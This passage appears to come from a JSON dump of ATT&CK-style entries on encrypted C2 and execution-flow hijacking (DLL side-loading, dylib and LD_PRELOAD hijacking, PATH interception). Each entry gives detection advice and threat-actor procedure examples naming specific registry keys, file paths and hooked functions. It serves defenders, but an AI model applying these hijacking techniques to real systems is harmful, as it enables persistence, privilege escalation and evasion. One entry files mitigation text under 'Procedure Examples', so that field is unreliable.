      "Lumma Stealerhas used HTTPS for command and control purposes.[44]",
      "LunarWebcan send short C2 commands, up to 512 bytes, encrypted with RSA-4096.[45]",
      "Machetehas used TLS-encrypted FTP to exfiltrate data.[46]",
      "Mangocan use TLS to encrypt C2 communications.[47]",
      "Metamorfo's C2 communication has been encrypted using OpenSSL.[48]",
      "Mispaducontains a copy of the OpenSSL library to encrypt C2 traffic.[49]",
      "Mythicsupports SSL encrypted C2.[50]",
      "NICECURLhas used HTTPS for C2 communications.[4]",
      "OilBoostercan use the OpenSSL library to encrypt C2 communications.[51]",
      "OilRigused thePowerExchangeutility and other tools to create tunnels to C2 servers.[52]",
      "DuringOperation Wocao, threat actors' proxy implementation \"Agent\" upgraded the socket in use to a TLS socket.[53]",
      "Pay2Keyhas used RSA encrypted communications with C2.[54]",
      "Penquincan encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.[55]",
      "PITSTOPhas the ability to communicate over TLS.[43]",
      "PoetRATused TLS to encrypt command and control (C2) communications.[56]",
      "POSHSPYencrypts C2 traffic with AES and RSA.[57]",
      "POWERSTATShas encrypted C2 traffic with RSA.[58]",
      "Pupy's default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.[59]",
      "RedCurlhas used HTTPS for C2 communication.[60][61]",
      "RedEchouses SSL for network communication.[37]",
      "REvilhas encrypted C2 communications with the ECIES algorithm.[62]",
      "Rising Sunvariants can use SSL for encrypting C2 communications.[63]",
      "Sagerunexuses HTTPS for command and control communication.[64]",
      "Sardonichas the ability to send a random 64-byte RC4 key to communicate with actor-controlled C2 servers by using an RSA public key.[65]",
      "ServHelpermay set up a reverse SSH tunnel to give the attacker access to services running on the victim, such as RDP.[66]",
      "Slivercan use mutual TLS and RSA  cryptography to exchange a session key.[67][68][69][70][71]",
      "Small Sievecan use SSL/TLS for its HTTPS Telegram Bot API-based C2 channel.[72]",
      "SnappyTCPcan use OpenSSL and TLS certificates to encrypt traffic.[73]",
      "SodaMastercan use a hardcoded RSA key to encrypt some of its C2 traffic.[74]",
      "SombRATcan SSL encrypt C2 traffic.[75][76][77]",
      "StrongPityhas encrypted C2 traffic using SSL/TLS.[78]",
      "Sykipotuses SSL for encrypting C2 communications.[79]",
      "TA2541has used TLS encrypted C2 communications including for campaigns using AsyncRAT.[80]",
      "TinyTurlahas the ability to encrypt C2 traffic with SSL/TLS.[81]",
      "Torencapsulates traffic in multiple layers of encryption, using TLS by default.[82]",
      "Trojan.Karaganycan secure C2 communications with SSL and TLS.[83]",
      "Tropic Trooperhas used SSL to connect to C2 servers.[84][85]",
      "Uroburoshas used a combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) to encrypt its top layer of C2 communications.[86]",
      "Velvet Anthas used a reverse SSH shell to securely communicate with victim devices.[87]",
      "Versa Director Zero Day Exploitationused HTTPS for command and control of compromised Versa Director servers.[88]",
      "SomeVolgmervariants use SSL to encrypt C2 communications.[89]",
      "WannaCryusesTorfor command and control traffic and routes a custom cryptographic protocol over theTorcircuit.[90]",
      "WellMailcan use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.[91][92]",
      "WellMesscan communicate to C2 with mutual TLS where client and server mutually check certificates.[93][94][95][92]",
      "Woody RATcan use RSA-4096 to encrypt data sent to its C2 server.[96]",
      "XTunneluses SSL/TLS and RC4 to encrypt traffic.[97][12]",
      "Zebrocyuses SSL and AES ECB for encrypting C2 communications.[98][99][100]"
    ]
  },
  "T1574": {
    "Name": "Hijack Execution Flow",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "Detects": [
      "Monitor executed commands and arguments that may execute their own malicious payloads by hijacking the way operating systems run programs.",
      "Monitor for newly constructed files that may execute their own malicious payloads by hijacking the way operating systems run programs.",
      "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.",
      "Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths.",
      "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
      "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.",
      "Monitor for changes made to windows registry keys and/or values that may execute their own malicious payloads by hijacking the way operating systems run programs."
    ],
    "Procedure Examples": [
      "DuringC0017,APT41established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.[1]",
      "COATHANGERwill remove and write malicious shared objects associated with legitimate system functions such asread(2).[2]",
      "DarkGateedits the Registry keyHKCU\\Software\\Classes\\mscfile\\shell\\open\\commandto execute a malicious AutoIt script.[3]When eventvwr.exe is executed, this will call the Microsoft Management Console (mmc.exe), which in turn references the modified Registry key.",
      "Denisreplaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.[4]",
      "One ofDtrackcan replace the normal flow of a program execution with malicious code.[5]",
      "Nightdooruses a legitimate executable to load a malicious DLL file for installation.[6]",
      "Pikabot Distribution February 2024utilized a tampered legitimate executable,grepWinNP3.exe, for its first stagePikabotloader, modifying the open-source tool to execute malicious code when launched.[7]",
      "Raspberry Robinwill drop a copy of itself to a subfolder in%Program Data%or%Program Data%\\Microsoft\\to attempt privilege elevation and defense evasion if not running in Session 0.[8]",
      "Saint Botwill use the malicious fileslideshow.mp4if present to load the core API provided byntdll.dllto avoid any hooks placed on calls to the originalntdll.dllfile by endpoint detection and response or antimalware software.[9]",
      "ShimRatcan hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.[10]"
    ]
  },
  "T1574.001": {
    "Name": "Hijack Execution Flow:DLL",
    "Description": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.[1]Specific ways DLLs are abused by adversaries include:DLL SideloadingAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.Adversaries may also side-load other packages, such as BPLs (Borland Package Library).[2]DLL Search Order HijackingAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.[1]DLL RedirectionAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.[3][4]Phantom DLL HijackingAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.[5][6]DLL SubstitutionAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.[7]Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.[8][9]If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
    "Detects": [
      "Monitor newly constructed.manifestand.localredirection files that do not correlate with software updates. Monitor for the creation of phantom DLL files.",
      "Monitor for changes made to.manifest/.localredirection files, or file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. To detect DLL substitution, monitor for changes made to DLLs in trusted locations, such asC:\\Windows\\System32.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process (particularly known malicious ones), or that have the same file name but abnormal paths (e.g., loaded from a user-writable directory rather than a system one). Monitor DLLs loaded from remote locations.",
      "Monitor newly constructed processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs."
    ],
    "Procedure Examples": [
      "APT19launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.[10]",
      "APT3has been known to side load DLLs with a valid version of Chrome with one of their tools.[11][12]",
      "APT32ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).[13][14][15]",
      "APT41has used search order hijacking to execute malicious payloads, such asWinnti for Windows.[16]APT41has also used legitimate executables to perform DLL side-loading of their malware.[17]",
      "APT41 DUSTinvolved the use of DLL search order hijacking to executeDUSTTRAP.[18]APT41 DUSTused also DLL side-loading to executeDUSTTRAPvia an AhnLab uninstaller.[18]",
      "Aquatic Pandahas used DLL search-order hijacking to loadexe,dll, anddatfiles into memory.[19]Aquatic Pandaloaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems.[20]",
      "Astarothcan launch itself via DLL Search Order Hijacking.[21]",
      "BackdoorDiplomacyhas executed DLL search order hijacking.[22]",
      "BADNEWStypically loads its DLL file into a legitimate signed Java or VMware executable.[23][24]",
      "DLL side-loading has been used to executeBBSRATthrough a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along withBBSRATby the dropper.[25]",
      "BlackTechhas used DLL side loading by giving DLLs hardcoded names and placing them in searched directories.[26]",
      "BOOSTWRITEhas exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.[27]",
      "BRONZE BUTLERhas used legitimate applications to side-load malicious DLLs.[28]",
      "Brute Ratel C4has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO.[29]Brute Ratel C4has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.[29]",
      "Chaeshas used search order hijacking to load a malicious DLL.[30]",
      "Chimerahas used side loading to place malicious DLLs in memory.[31]",
      "Chinoxycan use a digitally signed binary (\"Logitech Bluetooth Wizard Host Process\") to load its dll into memory.[32]",
      "Cinnamon Tempesthas used search order hijacking to launchCobalt StrikeBeacons.[33][34]Cinnamon Tempesthas also abused legitimate executables to side-load weaponized DLLs.[35]",
      "Clamblingcan store a file namedmpsvc.dll, which opens a maliciousmpsvc.muifile, in the same folder as the legitimate Microsoft executableMsMpEng.exeto gain execution.[36][37]",
      "Crutchcan persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.[38]",
      "Daggerflyhas used legitimate software to side-loadPlugXloaders onto victim systems.[39]Daggerflyis also linked to multiple other instances of side-loading for initial loading activity.[40]",
      "DarkGateincludes one infection vector that leverages a malicious \"KeyScramblerE.DLL\" library that will load during the execution of the legitimate KeyScrambler application.[41]",
      "Denisexploits a security vulnerability to load a fake DLL and execute its code.[13]",
      "Downdelphuses search order hijacking of the Windows executable sysprep.exe to escalate privileges.[42]",
      "Dridexcan abuse legitimate Windows executables to side-load malicious DLL files.[43]",
      "Earth Luscahas placed a malicious payload in%WINDIR%\\SYSTEM32\\oci.dllso it would be sideloaded by the MSDTC service.[44]",
      "Ecipekaccan abuse the legitimate application policytool.exe to load a malicious DLL.[45]",
      "Egregorhas used DLL side-loading to execute its payload.[46]",
      "Empirecontains modules that can discover and exploit various DLL hijacking opportunities.[47]",
      "Evilnumhas used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder.[48]",
      "FIN13has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).[49]",
      "FinFisheruses DLL side-loading to load malicious programs.[50][51]AFinFishervariant also uses DLL search order hijacking.[50][52]",
      "FoggyWeb's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimateversion.dllduring theMicrosoft.IdentityServer.ServiceHost.exeexecution process.[53]",
      "GALLIUMused DLL side-loading to covertly loadPoisonIvyinto memory on the victim machine.[54]",
      "Agh0st RATvariant has used DLL side-loading.[55]",
      "Goopyhas the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google.[14]",
      "Higaisa’s JavaScript file used a legitimate Microsoft Office 2007 package to side-load theOINFO12.OCXdynamic link library.[56]",
      "Hikithas usedDLLto loadoci.dllas a persistence mechanism.[57]",
      "HTTPBrowserabuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.[58]HTTPBrowserhas also used DLL side-loading.[59]",
      "HUI Loadercan be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking.[34]",
      "HyperBrohas used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload.[60][61]",
      "InvisiMolecan be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.[62]",
      "Javalican use DLL side-loading to load malicious DLLs into legitimate executables.[21]",
      "Kerrdowncan use DLL side-loading to load malicious DLLs.[63]",
      "Lazarus Grouphas replacedwin_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload.[64]Lazarus Grouputilized DLL side-loading to execute malicious payloads through abuse of the legitimate processeswsmprovhost.exeanddfrgui.exe.[65]",
      "LoFiSehas been executed as a file named DsNcDiag.dll through side-loading.[66]",
      "LookBackside loads its communications module as a DLL into thelibcurl.dllloader.[67]",
      "LuminousMothhas used legitimate executables such aswinword.exeandigfxem.exeto side-load their malware.[68][69]",
      "Lumma Stealerhas leveraged legitimate applications to then side-load malicious DLLs during execution.[70]",
      "Melcozcan use DLL hijacking to bypass security controls.[21]",
      "menuPasshas used DLL side-loading to launch versions of Mimikatz and PwDump6 as well asUPPERCUT.[71][72][73]menuPasshas also used DLL search order hijacking.[74]",
      "metaMaincan support an HKCMD sideloading start method.[75]",
      "Metamorfohas side-loaded its malicious DLL file.[76][77][78]",
      "MirageFoxis likely loaded via DLL hijacking into a legitimate McAfee binary.[79]",
      "MuddyWatermaintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.[80]",
      "Mustang Pandahas used a legitimately signed executable to execute a malicious payload within a DLL file.[81][82][83]",
      "Naikonhas used DLL side-loading to load malicious DLL's into legitimate executables.[84]",
      "Nebulaecan use DLL side-loading to gain execution.[85]",
      "Ninjaloaders can be side-loaded with legitimate and signed executables including the  VLC.exe media player.[66]",
      "DuringOperation CuckooBees, the threat actors used the legitimate Windows servicesIKEEXTandPrintNotifyto side-load malicious DLLs.[86]",
      "Pandoracan use DLL side-loading to execute malicious payloads.[61]",
      "APatchwork.dll that containsBADNEWSis loaded and executed using DLL side-loading.[87]",
      "Pcexterhas been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading.[66]",
      "PlugXhas the ability to use DLL search order hijacking for installation on targeted systems.[88]PlugXhas also used DLL side-loading to evade anti-virus.[12][59][89][71][90][36][91]",
      "PowerSploitcontains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.[92][93]",
      "PowGoopcan side-loadGoopdate.dllintoGoogleUpdate.exe.[80][94]",
      "Prikormkauses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.[95]",
      "QakBothas the ability to use DLL side-loading for execution.[96]",
      "RainyDaycan use side-loading to run malicious executables.[85]",
      "Ramsaycan hijack outdated Windows application dependencies with malicious versions of its own DLL payload.[97]",
      "Raspberry Robincan use legitimate, signed EXE files paired with malicious DLL files to load and run malicious payloads while bypassing defenses.[98]",
      "RCSessioncan be installed via DLL side-loading.[99][36][91]",
      "Mustang Pandaused DLL search order hijacking on vulnerable applications to installPlugXpayloads duringRedDelta Modified PlugX Infection Chain Operations.[100]",
      "RedLeavesis launched through use of DLL search order hijacking to load a malicious dll.[101]",
      "RTMhas used search order hijacking to force TeamViewer to load a malicious DLL.[102]",
      "Sakulauses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.[103]",
      "SideCopyhas used a malicious loader DLL file to execute thecredwiz.exeprocess and side-load the malicious payloadDuser.dll.[104]",
      "Sidewinderhas used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.[105]",
      "Storm-1811has deployed a malicious DLL (7z.DLL) that is sideloaded by a modified, legitimate installer (7zG.exe) when that installer is executed with an additional command line parameter ofbat runtime to load aCobalt Strikebeacon payload.[106]",
      "StrelaStealerhas sideloaded a DLL payload using a renamed, legitimatemsinfo32.exeexecutable.[107]",
      "SysUpdatecan load DLLs through vulnerable legitimate executables.[61]",
      "During theT9000installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.[108]",
      "Threat Group-3390has performed DLL search order hijacking to execute their payload.[109]Threat Group-3390has also used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well asrc.exe, a legitimate Microsoft Resource Compiler.[59][110][111][60][112]",
      "Tonto Teamabuses a legitimate and signed Microsoft executable to launch a malicious DLL.[113]",
      "Tropic Trooperhas been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.[114][115]",
      "Velvet Anthas used malicious DLLs executed via legitimate EXE files through DLL search order hijacking to launch follow-on payloads such asPlugX.[116]",
      "WastedLockerhas performed DLL hijacking before execution.[117]",
      "Waterbearhas used DLL side loading to import and load a malicious DLL loader.[26]",
      "Variants ofWEBC2achieve persistence by using DLL search order hijacking, usually by copying the DLL file to%SYSTEMROOT%(C:\\WINDOWS\\ntshrui.dll).[118]",
      "Whiteflyhas used search order hijacking to run the loader Vcrodat.[119]",
      "Wingbirdside loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.[120][121]",
      "ZeroThas used DLL side-loading to load malicious payloads.[122][123]"
    ]
  },
  "T1574.004": {
    "Name": "Hijack Execution Flow:Dylib Hijacking",
    "Description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with@rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as theLC_LOAD_WEAK_DYLIBfunction, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.[1][2][3][4]Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.[5][6][7]",
    "Detects": [
      "Monitor for newly constructed dylibs",
      "Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process.",
      "Monitor for dynamic libraries being loaded. Run path dependent libraries can include LC_LOAD_DYLIB, LC_LOAD_WEAK_DYLIB, and LC_RPATH. Other special keywords are recognized by the macOS loader are @rpath, @loader_path, and @executable_path.[9]These loader instructions can be examined for individual binaries or frameworks using the otool -l command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking"
    ],
    "Procedure Examples": [
      "Empirehas a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.[8]"
    ]
  },
  "T1574.005": {
    "Name": "Hijack Execution Flow:Executable Installer File Permissions Weakness",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the%TEMP%directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage ofDLLsearch order hijacking.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related toBypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.[1][2]If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "Detects": [
      "Monitor for newly constructed files to match an existing service executable, it could be detected and correlated with other suspicious behavior.",
      "Monitor for changes to binaries and service executables that may normally occur during software updates.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor for newly constructed processes to match an existing service executables.",
      "Monitor for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques."
    ],
    "Procedure Examples": [
      "Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses.[3]",
      "Turn off UAC's privilege elevation for standard users[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]to automatically deny elevation requests, add:\"ConsentPromptBehaviorUser\"=dword:00000000. Consider enabling installer detection for all users by adding:\"EnableInstallerDetection\"=dword:00000001. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add:\"EnableInstallerDetection\"=dword:00000000. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.[2]",
      "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."
    ]
  },
  "T1574.006": {
    "Name": "Hijack Execution Flow:Dynamic Linker Hijacking",
    "Description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such asLD_PRELOADon Linux orDYLD_INSERT_LIBRARIESon macOS.[1][2][3]Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.[4][5][6]Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.[7]Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may setLD_PRELOADto point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have usedLD_PRELOADto inject a malicious library into every descendant process of thesshddaemon, resulting in execution under a legitimate process. When the executing sub-process calls theexecvefunction, for example, the malicious library’sexecvefunction is executed rather than the system functionexecvecontained in the system library on disk. This allows adversaries toHide Artifactsfrom detection, as hooking system functions such asexecveandreaddirenables malware to scrub its own artifacts from the results of commands such asls,ldd,iptables, anddmesg.[8][9][10]Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",
    "Detects": [
      "Monitor executed commands and arguments associated with modifications to variables and files associated with loading shared libraries such asLD_PRELOADon Linux andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor for newly constructed files that are added to absolute paths of shared libraries such asLD_PRELOADon Linux (such as/etc/ld.so.preload) andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor for changes to files associated with loading shared libraries such asLD_PRELOADon Linux (such as/etc/ld.so.preload) andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
      "Monitor for newly executed processes for unusual activity (e.g., a process that does not use the network begins to do so)."
    ],
    "Procedure Examples": [
      "APT41has configured payloads to load via LD_PRELOAD.[11]",
      "Aquatic Pandamodified theld.sopreload file in Linux environments to enable persistence for Winnti malware.[12]",
      "COATHANGERcopies the malicious file/data2/.bd.key/preload.soto/lib/preload.so, then launches a child process that executes the malicious file/data2/.bd.key/authdas/bin/authdwith the arguments/lib/preload.so reboot newreboot 1.[13]This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence.",
      "WhenEburyis running as an OpenSSH server, it uses LD_PRELOAD to inject its malicious shared module in to programs launched by SSH sessions.Eburyhooks the following functions fromlibcto inject into subprocesses;system,popen,execve,execvpe,execv,execvp, andexecl.[8][14]",
      "HiddenWaspadds itself as a shared object to the LD_PRELOAD environment variable.[15]",
      "Hildegardhas modified /etc/ld.so.preload to intercept shared library import functions.[16]",
      "Rockehas modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.[17]",
      "XCSSETadds malicious file paths to theDYLD_FRAMEWORK_PATHandDYLD_LIBRARY_PATHenvironment variables to execute malicious code.[18]"
    ]
  },
  "T1574.007": {
    "Name": "Hijack Execution Flow:Path Interception by PATH Environment Variable",
    "Description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.For example, on Windows if an adversary places a malicious program named \"net.exe\" inC:\\example path, which by default precedesC:\\Windows\\system32\\net.exein the PATH environment variable, when \"net\" is executed from the command-line theC:\\example pathwill be called instead of the system's legitimate executable atC:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from aCommand and Scripting Interpreter.[1]Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the$PATHvariable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl,Unix Shell Configuration Modification, or modifying the/etc/paths.dfolder contents.[2][3][4]",
    "Detects": [
      "Monitor for newly constructed files for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Also, monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.",
      "Monitor for newly executed processes for process executable paths that are named for partial directories.",
      "Monitor for modifications of PATH environment variable Registry keys such asHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\\Path. An adversary can add a new directory or list of directories before other locations where programs can be executed from."
    ],
    "Procedure Examples": [
      "DarkGateoverrides the%windir%environment variable by setting a Registry key,HKEY_CURRENT_User\\Environment\\windir, to an alternate command to execute a malicious AutoIt script. This allowsDarkGateto run every time the scheduled taskDiskCleanupis executed as this uses the path value%windir%\\system32\\cleanmgr.exefor execution.[5]",
      "Empirecontains modules that can discover and exploit path interception opportunities in the PATH environment variable.[6]",
      "PowerSploitcontains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.[7][8]"
    ]
  },
  "T1574.008": {
    "Name": "Hijack Execution Flow:Path Interception by Search Order Hijacking",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. UnlikeDLLsearch order hijacking, the search order differs depending on the method that is used to execute the program.[1][2][3]However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argumentnet user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", thencmd.exe /C net userwill execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.[4]Search order hijacking is also a common practice for hijacking DLL loads and is covered inDLL.",
    "Detects": [
      "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Also, monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.",
